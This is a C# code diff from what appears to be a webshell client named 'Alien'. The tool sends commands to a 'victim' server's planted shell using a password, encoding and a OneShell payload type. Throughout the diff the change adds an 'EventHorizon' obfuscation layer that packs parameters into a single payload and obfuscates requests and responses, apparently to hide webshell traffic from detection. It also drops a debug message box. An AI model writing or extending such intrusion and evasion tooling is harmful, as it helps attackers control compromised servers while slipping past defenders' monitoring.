@@ -13,6 +13,7 @@ using System.Security.Cryptography.X509Certificates;
 using System.Net;
 using System.Text.RegularExpressions;
 using System.Text.Json.Nodes;
+using System.Text.Json.Serialization;
 
 namespace Alien
 {
@@ -611,21 +612,6 @@ namespace Alien
                 {
                     // OneShell
 
-                    var config = m_victim.m_ShellConfig;
-                    if (config.bEHEnable)
-                    {
-                        var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
-                        if (dicParam == null)
-                            throw new Exception("Invalid JSON string");
-
-                        string[] split = szPayloadData.Split('=');
-                        string szLoader = split[1];
-
-                        szPayloadData = await m_tamper.fnObfuscate(config.szEventHorizonScript, szLoader, dicParam) ?? string.Empty;
-                        if (!config.bRaw)
-                            szPayloadData = split[0] + "=" + szPayloadData;
-                    }
-
                     content = new StringContent(
                         szPayloadData,
                         Encoding.GetEncoding(m_victim.ShellEncoding),
@@ -640,6 +626,19 @@ namespace Alien
 
                 if (m_victim.ShellPayloadType == enPayloadType.OneShell)
                 {
+                    if (m_victim.m_ShellConfig.bEHEnable)
+                    {
+                        var config = m_victim.m_ShellConfig;
+                        if (config.bEHEnable)
+                        {
+                            var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
+                            if (dicParam == null)
+                                throw new Exception("Invalid JSON string");
+
+                            szRespContent = await m_tamper.fnDeobfuscate(m_victim.m_ShellConfig.szEventHorizonScript, szRespContent, dicParam);
+                        }
+                    }
+
                     szSplitter = $"[{szSplitter}]";
 
                     try
@@ -944,11 +943,16 @@ namespace Alien
             else
             {
                 //OneShell
+                var config = m_victim.m_ShellConfig;
 
                 for (int i = 0; i < asParams.Length; i++)
-                    asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";
+                {
+                    if (config.bEHEnable)
+                        asParams[i] = clsEzData.fnszStre2b64(asParams[i]);
+                    else
+                        asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";
+                }
 
-                var config = m_victim.m_ShellConfig;
                 if (config.bEHEnable)
                     szPayload = clsTamper.fnMergePayloadToOne(szPayload, asParams, config.language);
 
@@ -965,7 +969,10 @@ namespace Alien
                     .Replace("%5BENCODING%5D", Uri.EscapeDataString(m_victim.ShellEncoding))
                     .Replace(" ", "%20");
 
-                szPayload = $"{m_victim.ShellPassword}={szLoader}" + (config.bEHEnable ? string.Empty : $"&{szParams}");
+                szPayload = (config.bEHEnable ? string.Empty : $"{m_victim.ShellPassword}=") + szLoader + (config.bEHEnable ? string.Empty : $"&{szParams}");
+                if (config.bEHEnable)
+                    szPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, Uri.UnescapeDataString(szPayload), JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
+
             }
 
             return await fnHttpPOST(szPayload, szSplitter);
@@ -1018,8 +1025,6 @@ namespace Alien
                     szPayload = szPayload.Replace(szPattern, string.Empty);
                 }
 
-                const string split = "----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------";
-                szPayload = szPayload.Split(new string[] { split }, StringSplitOptions.None).Last();
 
                 string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                 szPayload = $"{szSplitFunc}\r\n{szPayload}\r\n{szSplitFunc}";
@@ -1133,8 +1138,6 @@ namespace Alien
                         byte[] abResp = await resp.Content.ReadAsByteArrayAsync();
 
                         string szResp = Encoding.UTF8.GetString(abResp);
-
-                        MessageBox.Show(szResp);
 
                         return true;
                     }
